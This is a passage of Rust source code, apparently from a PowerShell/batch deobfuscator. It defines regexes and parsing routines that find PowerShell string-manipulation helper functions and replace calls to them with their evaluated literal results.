        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?return\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*Replace\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)[^{}]*\}"#,
    )
    .expect("literal dot-replace extractor def")
});

#[allow(clippy::expect_used)]
static LITERAL_SUBSTRING_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+(?:[A-Za-z_][A-Za-z0-9_]*:)?([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?(?:return\s+)?\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*Substring\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)[^{}]*\}"#,
    )
    .expect("literal substring extractor def")
});

#[allow(clippy::expect_used)]
static LITERAL_TAIL_SUBSTRING_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+(?:[A-Za-z_][A-Za-z0-9_]*:)?([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?(?:return\s+)?\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*Substring\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)[^{}]*\}"#,
    )
    .expect("literal tail substring extractor def")
});

#[allow(clippy::expect_used)]
static LITERAL_CONST_SUBSTRING_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+(?:[A-Za-z_][A-Za-z0-9_]*:)?([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?(?:return\s+)?\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*Substring\s*\(\s*(\d+)\s*,\s*(\d+)\s*\)[^{}]*\}"#,
    )
    .expect("literal constant substring extractor def")
});

const PS_FUNCTION_BLOCK_MAX_BYTES: usize = 16 * 1024;
const PS_FUNCTION_BLOCK_MAX_DEFS: usize = 512;
const PS_FUNCTION_HEADER_MAX_BYTES: usize = 1024;

fn ascii_word_at(bytes: &[u8], pos: usize, word: &[u8]) -> bool {
    pos + word.len() <= bytes.len()
        && !is_ident_byte(pos.checked_sub(1).and_then(|idx| bytes.get(idx).copied()))
        && !is_ident_byte(bytes.get(pos + word.len()).copied())
        && bytes[pos..pos + word.len()]
            .iter()
            .zip(word.iter())
            .all(|(left, right)| left.eq_ignore_ascii_case(right))
}

fn is_ps_function_name_start(byte: u8) -> bool {
    byte.is_ascii_alphabetic() || byte == b'_'
}

fn is_ps_function_name_rest(byte: u8) -> bool {
    byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-')
}

fn parse_ps_function_name(bytes: &[u8], mut pos: usize) -> Option<usize> {
    if !is_ps_function_name_start(*bytes.get(pos)?) {
        return None;
    }
    pos += 1;
    while bytes
        .get(pos)
        .copied()
        .is_some_and(|byte| byte.is_ascii_alphanumeric() || byte == b'_')
    {
        pos += 1;
    }
    if bytes.get(pos) == Some(&b':') {
        pos += 1;
        if !is_ps_function_name_start(*bytes.get(pos)?) {
            return None;
        }
        pos += 1;
    }
    while bytes
        .get(pos)
        .copied()
        .is_some_and(is_ps_function_name_rest)
    {
        pos += 1;
    }
    Some(pos)
}

fn find_ps_function_open_brace(text: &str, mut pos: usize) -> Option<usize> {
    let bytes = text.as_bytes();
    let end = pos
        .saturating_add(PS_FUNCTION_HEADER_MAX_BYTES)
        .min(bytes.len());
    while pos < end {
        match bytes[pos] {
            b'{' => return Some(pos),
            b'\'' => {
                pos += 1;
                while pos < end {
                    if bytes[pos] == b'\'' {
                        if bytes.get(pos + 1) == Some(&b'\'') {
                            pos += 2;
                        } else {
                            pos += 1;
                            break;
                        }
                    } else {
                        pos += 1;
                    }
                }
            }
            b'"' => {
                pos += 1;
                while pos < end {
                    if bytes[pos] == b'`' {
                        pos = (pos + 2).min(end);
                    } else if bytes[pos] == b'"' {
                        pos += 1;
                        break;
                    } else {
                        pos += 1;
                    }
                }
            }
            b'#' => {
                while pos < end && !matches!(bytes[pos], b'\r' | b'\n') {
                    pos += 1;
                }
            }
            _ => pos += 1,
        }
    }
    None
}

fn find_ps_function_block_end(text: &str, open_brace: usize) -> Option<usize> {
    let bytes = text.as_bytes();
    let end = open_brace
        .saturating_add(PS_FUNCTION_BLOCK_MAX_BYTES)
        .min(bytes.len());
    let mut pos = open_brace;
    let mut depth = 0usize;
    while pos < end {
        match bytes[pos] {
            b'{' => {
                depth = depth.saturating_add(1);
                pos += 1;
            }
            b'}' => {
                depth = depth.saturating_sub(1);
                pos += 1;
                if depth == 0 {
                    return Some(pos);
                }
            }
            b'\'' => {
                pos += 1;
                while pos < end {
                    if bytes[pos] == b'\'' {
                        if bytes.get(pos + 1) == Some(&b'\'') {
                            pos += 2;
                        } else {
                            pos += 1;
                            break;
                        }
                    } else {
                        pos += 1;
                    }
                }
            }
            b'"' => {
                pos += 1;
                while pos < end {
                    if bytes[pos] == b'`' {
                        pos = (pos + 2).min(end);
                    } else if bytes[pos] == b'"' {
                        pos += 1;
                        break;
                    } else {
                        pos += 1;
                    }
                }
            }
            b'#' => {
                while pos < end && !matches!(bytes[pos], b'\r' | b'\n') {
                    pos += 1;
                }
            }
            _ => pos += 1,
        }
    }
    None
}

fn scan_ps_function_blocks(text: &str, mut visit: impl FnMut(&str)) {
    let bytes = text.as_bytes();
    let mut pos = 0usize;
    let mut defs = 0usize;
    while pos < bytes.len() && defs < PS_FUNCTION_BLOCK_MAX_DEFS {
        match bytes[pos] {
            b'\'' => {
                pos += 1;
                while pos < bytes.len() {
                    if bytes[pos] == b'\'' {
                        if bytes.get(pos + 1) == Some(&b'\'') {
                            pos += 2;
                        } else {
                            pos += 1;
                            break;
                        }
                    } else {
                        pos += 1;
                    }
                }
            }
            b'"' => {
                pos += 1;
                while pos < bytes.len() {
                    if bytes[pos] == b'`' {
                        pos = (pos + 2).min(bytes.len());
                    } else if bytes[pos] == b'"' {
                        pos += 1;
                        break;
                    } else {
                        pos += 1;
                    }
                }
            }
            b'#' => {
                while pos < bytes.len() && !matches!(bytes[pos], b'\r' | b'\n') {
                    pos += 1;
                }
            }
            _ if ascii_word_at(bytes, pos, b"function") => {
                let name_start = skip_ascii_ws(bytes, pos + "function".len());
                let Some(name_end) = parse_ps_function_name(bytes, name_start) else {
                    pos += "function".len();
                    continue;
                };
                let Some(open_brace) = find_ps_function_open_brace(text, name_end) else {
                    pos = name_end;
                    continue;
                };
                let Some(block_end) = find_ps_function_block_end(text, open_brace) else {
                    pos = open_brace + 1;
                    continue;
                };
                defs += 1;
                visit(&text[pos..block_end]);
                pos = block_end;
            }
            _ => pos += 1,
        }
    }
}

#[allow(clippy::expect_used)]
static LITERAL_TRIM_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?return\s+\(?\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)?\s*\.\s*Trim(Start|End)?\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)[^{}]*\}"#,
    )
    .expect("literal trim extractor def")
});

#[allow(clippy::expect_used)]
static LITERAL_PARAM_BLOCK_TRIM_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\{\s*param\s*\(([^)]*)\)[^{}]*?return\s+\(?\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)?\s*\.\s*Trim(Start|End)?\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)[^{}]*\}"#,
    )
    .expect("literal param-block trim extractor def")
});

#[allow(clippy::expect_used)]
static LITERAL_ITEM_PATH_TRIM_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\b(?:New-Item|n`?i|Set-Item|s`?i)\b[^{}]{0,512}\bFunction:\s*\\?\s*([A-Za-z_][A-Za-z0-9_-]*)[^{}]{0,512}-Value\s*\{\s*param\s*\(([^)]*)\)[^{}]*?return\s+\(?\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)?\s*\.\s*Trim(Start|End)?\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)[^{}]*\}"#,
    )
    .expect("literal item path trim extractor def")
});

#[allow(clippy::expect_used)]
static LITERAL_ITEM_NAME_TRIM_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\b(?:New-Item|n`?i|Set-Item|s`?i)\b[^{}]{0,512}-Name\s+([A-Za-z_][A-Za-z0-9_-]*)[^{}]{0,512}-Value\s*\{\s*param\s*\(([^)]*)\)[^{}]*?return\s+\(?\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)?\s*\.\s*Trim(Start|End)?\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)[^{}]*\}"#,
    )
    .expect("literal item name trim extractor def")
});

#[allow(clippy::expect_used)]
static LITERAL_CONST_TRIM_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?return\s+\(?\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)?\s*\.\s*Trim(Start|End)?\s*\(\s*'((?:''|[^'])*)'\s*\)[^{}]*\}"#,
    )
    .expect("literal constant trim extractor def")
});

#[allow(clippy::expect_used)]
static LITERAL_CASE_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?return\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*To(Lower|Upper)\s*\(\s*\)[^{}]*\}"#,
    )
    .expect("literal case extractor def")
});

#[allow(clippy::expect_used)]
static LITERAL_INDEX_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?return\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]|\.\s*(?:Chars|get_Chars)\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)|\.\s*ToCharArray\s*\(\s*\)\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\])[^{}]*\}"#,
    )
    .expect("literal index extractor def")
});

#[allow(clippy::expect_used)]
static LITERAL_CONST_INDEX_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?return\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\[\s*(\d+)\s*\]|\.\s*(?:Chars|get_Chars)\s*\(\s*(\d+)\s*\)|\.\s*ToCharArray\s*\(\s*\)\s*\[\s*(\d+)\s*\])[^{}]*\}"#,
    )
    .expect("literal constant index extractor def")
});

#[allow(clippy::expect_used)]
static LITERAL_CONST_REMOVE_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?return\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*Remove\s*\(\s*(\d+)\s*,\s*(\d+)\s*\)[^{}]*\}"#,
    )
    .expect("literal constant remove extractor def")
});

#[allow(clippy::expect_used)]
static LITERAL_REMOVE_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?return\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*Remove\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)(?:\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*))?\s*\)[^{}]*\}"#,
    )
    .expect("literal remove extractor def")
});

#[allow(clippy::expect_used)]
static LITERAL_CONST_INSERT_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?return\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*Insert\s*\(\s*(\d+)\s*,\s*'((?:''|[^'])*)'\s*\)[^{}]*\}"#,
    )
    .expect("literal constant insert extractor def")
});

#[allow(clippy::expect_used)]
static LITERAL_INSERT_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?return\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*Insert\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)[^{}]*\}"#,
    )
    .expect("literal insert extractor def")
});

#[allow(clippy::expect_used)]
static LITERAL_CONST_DOT_REPLACE_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?return\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\.\s*Replace\s*\(\s*'((?:''|[^'])*)'\s*,\s*'((?:''|[^'])*)'\s*\)[^{}]*\}"#,
    )
    .expect("literal constant dot-replace extractor def")
});

#[allow(clippy::expect_used)]
static LITERAL_CONST_DASH_REPLACE_EXTRACTOR_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+([A-Za-z_][A-Za-z0-9_-]*)\s*\(([^)]*)\)\s*\{[^{}]*?return\s+\$([A-Za-z_][A-Za-z0-9_]*)\s+-i?replace\s+'((?:''|[^'])*)'\s*,\s*'((?:''|[^'])*)'[^{}]*\}"#,
    )
    .expect("literal constant dash-replace extractor def")
});

const PS_LITERAL_SPACE_SENTINEL: &str = "__BATDEOB_PS_LITERAL_SPACE__";

fn is_ps_command_atom(value: &str) -> bool {
    !value.is_empty()
        && value
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-'))
}

fn inline_ps_literal_calls_to_target(text: &str, name: &str, target: &str) -> String {
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut search_from = 0;

    while let Some(start) = find_ascii_case_insensitive_from(text, name, search_from) {
        let end_name = start + name.len();
        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
            || is_ident_byte(bytes.get(end_name).copied())
        {
            search_from = end_name;
            continue;
        }

        let mut pos = skip_ascii_ws(bytes, end_name);
        let parenthesized = bytes.get(pos) == Some(&b'(');
        if parenthesized {
            pos = skip_ascii_ws(bytes, pos + 1);
        }
        if bytes.get(pos) != Some(&b'\'') {
            search_from = end_name;
            continue;
        }
        let Some((literal_end, value)) = parse_ps_single_quoted_literal(text, pos) else {
            search_from = end_name;
            continue;
        };
        let mut call_end = literal_end;
        if parenthesized {
            let after = skip_ascii_ws(bytes, call_end);
            if bytes.get(after) != Some(&b')') {
                search_from = end_name;
                continue;
            }
            call_end = after + 1;
        }
        let raw_match = &text[start..call_end];
        let name_start = raw_match
            .find(|c: char| c.is_alphanumeric() || c == '_')
            .unwrap_or(0);
        let prefix = &raw_match[..name_start];
        matches.push((
            start,
            call_end,
            format!("{}{} ('{}')", prefix, target, value.replace('\'', "''")),
        ));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum PsLiteralCallArg {
    String(String),
    Integer(usize),
    NamedString { name: String, value: String },
    NamedInteger { name: String, value: usize },
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct PsLiteralArgBinding {
    name: String,
    position: usize,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum PsTrimMode {
    Both,
    Start,
    End,
}

impl PsTrimMode {
    fn from_suffix(suffix: Option<&str>) -> Self {
        match suffix.unwrap_or_default().to_ascii_lowercase().as_str() {
            "start" => Self::Start,
            "end" => Self::End,
            _ => Self::Both,
        }
    }

    fn apply(self, value: &str, chars: &str) -> String {
        match self {
            Self::Both => value.trim_matches(|ch| chars.contains(ch)).to_string(),
            Self::Start => value
                .trim_start_matches(|ch| chars.contains(ch))
                .to_string(),
            Self::End => value.trim_end_matches(|ch| chars.contains(ch)).to_string(),
        }
    }
}

fn ps_literal_string_assignments_to(text: &str, value: &str) -> Vec<String> {
    PS_VAR_ASSIGN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let name = caps.get(1)?.as_str();
            let assigned = caps
                .get(2)
                .map(|m| m.as_str().replace("''", "'"))
                .or_else(|| caps.get(3).map(|m| m.as_str().to_string()))?;
            assigned
                .eq_ignore_ascii_case(value)
                .then(|| name.to_ascii_lowercase())
        })
        .collect()
}

fn find_ps_literal_extractor_invocation(
    text: &str,
    name: &str,
    aliases: &[String],
    search_from: usize,
) -> Option<(usize, usize, usize)> {
    let bytes = text.as_bytes();
    let mut next_from = search_from;
    while let Some(start) = find_ascii_case_insensitive_from(text, name, next_from) {
        let end_name = start + name.len();
        next_from = end_name;

        let quoted_call = text
            .get(start.saturating_sub(3)..start)
            .is_some_and(|prefix| prefix.eq_ignore_ascii_case("& '"))
            && bytes.get(end_name) == Some(&b'\'');
        if quoted_call {
            return Some((start - 3, end_name + 1, skip_ascii_ws(bytes, end_name + 1)));
        }

        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
            || is_ident_byte(bytes.get(end_name).copied())
        {
            continue;
        }

        let pos = skip_ascii_ws(bytes, end_name);
        if text
            .get(start.saturating_sub(2)..start)
            .is_some_and(|prefix| prefix.eq_ignore_ascii_case("& "))
        {
            return Some((start - 2, end_name, pos));
        }
        return Some((start, end_name, pos));
    }

    for alias in aliases {
        let needle = format!("& ${alias}");
        let Some(call_start) = find_ascii_case_insensitive_from(text, &needle, search_from) else {
            continue;
        };
        let end_name = call_start + needle.len();
        return Some((call_start, end_name, skip_ascii_ws(bytes, end_name)));
    }

    None
}

fn parse_ps_literal_call_args(
    text: &str,
    mut pos: usize,
) -> Option<(usize, Vec<PsLiteralCallArg>)> {
    let bytes = text.as_bytes();
    let parenthesized = bytes.get(pos) == Some(&b'(');
    if parenthesized {
        pos = skip_ascii_ws(bytes, pos + 1);
    }
    let mut args = Vec::new();
    loop {
        pos = skip_ascii_ws(bytes, pos);
        if parenthesized && bytes.get(pos) == Some(&b')') {
            return Some((pos + 1, args));
        }
        if bytes.get(pos) == Some(&b'-') {
            let name_start = pos + 1;
            let mut name_end = name_start;
            while bytes
                .get(name_end)
                .is_some_and(|b| b.is_ascii_alphanumeric() || *b == b'_')
            {
                name_end += 1;
            }
            if name_end == name_start {
                return None;
            }
            let name = text[name_start..name_end].to_ascii_lowercase();
            pos = skip_ascii_ws(bytes, name_end);
            if bytes.get(pos) == Some(&b'\'') {
                let (literal_end, value) = parse_ps_single_quoted_literal(text, pos)?;
                args.push(PsLiteralCallArg::NamedString { name, value });
                pos = literal_end;
            } else if bytes.get(pos).is_some_and(|b| b.is_ascii_digit()) {
                let start = pos;
                while bytes.get(pos).is_some_and(|b| b.is_ascii_digit()) {
                    pos += 1;
                }
                args.push(PsLiteralCallArg::NamedInteger {
                    name,
                    value: text[start..pos].parse().ok()?,
                });
            } else {
                return None;
            }
        } else if bytes.get(pos) == Some(&b'\'') {
            let (literal_end, value) = parse_ps_single_quoted_literal(text, pos)?;
            args.push(PsLiteralCallArg::String(value));
            pos = literal_end;
        } else if bytes.get(pos).is_some_and(|b| b.is_ascii_digit()) {
            let start = pos;
            while bytes.get(pos).is_some_and(|b| b.is_ascii_digit()) {
                pos += 1;
            }
            args.push(PsLiteralCallArg::Integer(text[start..pos].parse().ok()?));
        } else if args.is_empty() {
            return None;
        } else {
            return if parenthesized {
                None
            } else {
                Some((pos, args))
            };
        }
        pos = skip_ascii_ws(bytes, pos);
        if parenthesized {
            if bytes.get(pos) == Some(&b',') {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
        } else if !matches!(bytes.get(pos), Some(b'-' | b'\'' | b'0'..=b'9')) {
            return Some((pos, args));
        }
    }
}

fn ps_literal_arg_by_name_or_position<'a>(
    args: &'a [PsLiteralCallArg],
    name: &str,
    position: usize,
) -> Option<&'a PsLiteralCallArg> {
    args.iter()
        .find(|arg| match arg {
            PsLiteralCallArg::NamedString { name: arg_name, .. }
            | PsLiteralCallArg::NamedInteger { name: arg_name, .. } => {
                arg_name.eq_ignore_ascii_case(name)
            }
            PsLiteralCallArg::String(_) | PsLiteralCallArg::Integer(_) => false,
        })
        .or_else(|| {
            args.iter()
                .filter(|arg| {
                    matches!(
                        arg,
                        PsLiteralCallArg::String(_) | PsLiteralCallArg::Integer(_)
                    )
                })
                .nth(position)
        })
}

fn ps_literal_arg_as_string(arg: &PsLiteralCallArg) -> Option<&str> {
    match arg {
        PsLiteralCallArg::String(value) | PsLiteralCallArg::NamedString { value, .. } => {
            Some(value)
        }
        PsLiteralCallArg::Integer(_) | PsLiteralCallArg::NamedInteger { .. } => None,
    }
}

fn ps_literal_arg_as_integer(arg: &PsLiteralCallArg) -> Option<usize> {
    match arg {
        PsLiteralCallArg::Integer(value) | PsLiteralCallArg::NamedInteger { value, .. } => {
            Some(*value)
        }
        PsLiteralCallArg::String(_) | PsLiteralCallArg::NamedString { .. } => None,
    }
}

fn inline_ps_literal_replace_extractor_calls(
    text: &str,
    name: &str,
    value_binding: &PsLiteralArgBinding,
    needle_binding: &PsLiteralArgBinding,
    replacement_binding: &PsLiteralArgBinding,
) -> String {
    let mut matches = Vec::new();
    let mut search_from = 0;
    let aliases = ps_literal_string_assignments_to(text, name);

    while let Some((start, end_name, pos)) =
        find_ps_literal_extractor_invocation(text, name, &aliases, search_from)
    {
        let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
            search_from = end_name;
            continue;
        };
        let Some(value) =
            ps_literal_arg_by_name_or_position(&args, &value_binding.name, value_binding.position)
                .and_then(ps_literal_arg_as_string)
        else {
            search_from = call_end;
            continue;
        };
        let Some(needle) = ps_literal_arg_by_name_or_position(
            &args,
            &needle_binding.name,
            needle_binding.position,
        )
        .and_then(ps_literal_arg_as_string) else {
            search_from = call_end;
            continue;
        };
        let Some(replacement_arg) = ps_literal_arg_by_name_or_position(
            &args,
            &replacement_binding.name,
            replacement_binding.position,
        )
        .and_then(ps_literal_arg_as_string) else {
            search_from = call_end;
            continue;
        };
        let replacement = value.replace(needle, replacement_arg);
        matches.push((
            start,
            call_end,
            format!("'{}'", replacement.replace('\'', "''")),
        ));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_literal_const_replace_extractor_calls(
    text: &str,
    name: &str,
    value_binding: &PsLiteralArgBinding,
    needle: &str,
    replacement_arg: &str,
) -> String {
    let mut matches = Vec::new();
    let mut search_from = 0;
    let aliases = ps_literal_string_assignments_to(text, name);

    while let Some((start, end_name, pos)) =
        find_ps_literal_extractor_invocation(text, name, &aliases, search_from)
    {
        let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
            search_from = end_name;
            continue;
        };
        let Some(value) =
            ps_literal_arg_by_name_or_position(&args, &value_binding.name, value_binding.position)
                .and_then(ps_literal_arg_as_string)
        else {
            search_from = call_end;
            continue;
        };
        let replacement = value.replace(needle, replacement_arg);
        matches.push((
            start,
            call_end,
            format!("'{}'", replacement.replace('\'', "''")),
        ));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_literal_substring_extractor_calls(
    text: &str,
    name: &str,
    value_binding: &PsLiteralArgBinding,
    start_binding: &PsLiteralArgBinding,
    count_binding: &PsLiteralArgBinding,
) -> String {
    let mut matches = Vec::new();
    let mut search_from = 0;
    let aliases = ps_literal_string_assignments_to(text, name);

    while let Some((start, end_name, pos)) =
        find_ps_literal_extractor_invocation(text, name, &aliases, search_from)
    {
        let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
            search_from = end_name;
            continue;
        };
        let Some(value) =
            ps_literal_arg_by_name_or_position(&args, &value_binding.name, value_binding.position)
                .and_then(ps_literal_arg_as_string)
        else {
            search_from = call_end;
            continue;
        };
        let Some(start_index) =
            ps_literal_arg_by_name_or_position(&args, &start_binding.name, start_binding.position)
                .and_then(ps_literal_arg_as_integer)
        else {
            search_from = call_end;
            continue;
        };
        let Some(count) =
            ps_literal_arg_by_name_or_position(&args, &count_binding.name, count_binding.position)
                .and_then(ps_literal_arg_as_integer)
        else {
            search_from = call_end;
            continue;
        };
        let chars: Vec<char> = value.chars().collect();
        let end_index = start_index.saturating_add(count);
        if start_index > chars.len() || end_index > chars.len() {
            search_from = call_end;
            continue;
        }
        let replacement: String = chars[start_index..end_index].iter().collect();
        matches.push((
            start,
            call_end,
            format!("'{}'", replacement.replace('\'', "''")),
        ));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_literal_tail_substring_extractor_calls(
    text: &str,
    name: &str,
    value_binding: &PsLiteralArgBinding,
    start_binding: &PsLiteralArgBinding,
) -> String {
    let mut matches = Vec::new();
    let mut search_from = 0;
    let aliases = ps_literal_string_assignments_to(text, name);

    while let Some((start, end_name, pos)) =
        find_ps_literal_extractor_invocation(text, name, &aliases, search_from)
    {
        let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
            search_from = end_name;
            continue;
        };
        let Some(value) =
            ps_literal_arg_by_name_or_position(&args, &value_binding.name, value_binding.position)
                .and_then(ps_literal_arg_as_string)
        else {
            search_from = call_end;
            continue;
        };
        let Some(start_index) =
            ps_literal_arg_by_name_or_position(&args, &start_binding.name, start_binding.position)
                .and_then(ps_literal_arg_as_integer)
        else {
            search_from = call_end;
            continue;
        };
        let chars: Vec<char> = value.chars().collect();
        if start_index > chars.len() {
            search_from = call_end;
            continue;
        }
        let replacement: String = chars[start_index..].iter().collect();
        matches.push((
            start,
            call_end,
            format!("'{}'", replacement.replace('\'', "''")),
        ));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_literal_const_substring_extractor_calls(
    text: &str,
    name: &str,
    value_binding: &PsLiteralArgBinding,
    start_index: usize,
    count: usize,
) -> String {
    let mut matches = Vec::new();
    let mut search_from = 0;
    let aliases = ps_literal_string_assignments_to(text, name);

    while let Some((start, end_name, pos)) =
        find_ps_literal_extractor_invocation(text, name, &aliases, search_from)
    {
        let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
            search_from = end_name;
            continue;
        };
        let Some(value) =
            ps_literal_arg_by_name_or_position(&args, &value_binding.name, value_binding.position)
                .and_then(ps_literal_arg_as_string)
        else {
            search_from = call_end;
            continue;
        };
        let chars: Vec<char> = value.chars().collect();
        let end_index = start_index.saturating_add(count);
        if start_index > chars.len() || end_index > chars.len() {
            search_from = call_end;
            continue;
        }
        let replacement: String = chars[start_index..end_index].iter().collect();
        matches.push((
            start,
            call_end,
            format!("'{}'", replacement.replace('\'', "''")),
        ));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_literal_remove_extractor_calls(
    text: &str,
    name: &str,
    value_binding: &PsLiteralArgBinding,
    start_binding: &PsLiteralArgBinding,
    count_binding: Option<&PsLiteralArgBinding>,
) -> String {
    let mut matches = Vec::new();
    let mut search_from = 0;
    let aliases = ps_literal_string_assignments_to(text, name);

    while let Some((start, end_name, pos)) =
        find_ps_literal_extractor_invocation(text, name, &aliases, search_from)
    {
        let Some((call_end, args)) = parse_ps_literal_call_args(text, pos) else {
            search_from = end_name;
            continue;
        };
        let Some(value) =
            ps_literal_arg_by_name_or_position(&args, &value_binding.name, value_binding.position)
                .and_then(ps_literal_arg_as_string)
        else {
            search_from = call_end;
            continue;
        };
        let Some(start_index) =
            ps_literal_arg_by_name_or_position(&args, &start_binding.name, start_binding.position)
                .and_then(ps_literal_arg_as_integer)
        else {
            search_from = call_end;
            continue;
        };
        let count = match count_binding {
            Some(binding) => {
                let Some(count) =
                    ps_literal_arg_by_name_or_position(&args, &binding.name, binding.position)
                        .and_then(ps_literal_arg_as_integer)
                else {
                    search_from = call_end;
                    continue;
                };
                Some(count)
            }
            None => None,
        };
        let mut chars: Vec<char> = value.chars().collect();
        if start_index > chars.len() {
            search_from = call_end;
            continue;
        }
        let end_index = count
            .map(|count| start_index.saturating_add(count))
            .unwrap_or(chars.len());
        if end_index > chars.len() {
            search_from = call_end;
            continue;
        }
